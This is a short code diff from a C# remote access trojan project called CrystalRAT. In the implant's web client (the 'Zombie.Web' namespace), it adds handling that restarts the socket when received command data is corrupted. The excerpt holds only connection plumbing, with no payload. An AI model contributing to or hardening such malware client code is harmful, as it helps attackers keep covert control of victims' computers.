@@ -1,4 +1,5 @@
-﻿using CrystalRATShared.Helper;
+﻿using CrystalRATShared.Commands;
+using CrystalRATShared.Helper;
 using CrystalRATShared.Serialization;
 using System;
 using System.Collections.Generic;
@@ -140,7 +141,11 @@ namespace Zombie.Web
 
             ms.Dispose();
 
-            CommandDataSerializer.Deserialize(data, FunctionManager.Process);
+            if (CommandDataSerializer.Deserialize(data, FunctionManager.Process) == CommandFlags.DataCorrupted)
+            {
+                Client.RestartSocket();
+                return;
+            }
 
             Receive();
 
